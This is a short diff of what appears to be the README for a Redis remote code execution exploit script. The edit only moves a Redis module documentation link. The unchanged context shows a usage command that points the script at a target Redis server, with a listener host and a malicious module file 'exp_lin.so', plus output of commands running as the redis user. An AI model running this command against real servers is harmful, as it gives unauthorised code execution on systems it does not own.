@@ -40,6 +40,9 @@ _sys_siglist
 ���Auid=100(redis) gid=101(redis) groups=101(redis),101(redis)
 
 ```
+https://redis-module-redoc.readthedocs.io/en/latest/
+
+
 ### Usage:
 
 `python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_lin.so`
@@ -69,7 +72,6 @@ $
 
 
 ```
-https://redis-module-redoc.readthedocs.io/en/latest/
 
 
 
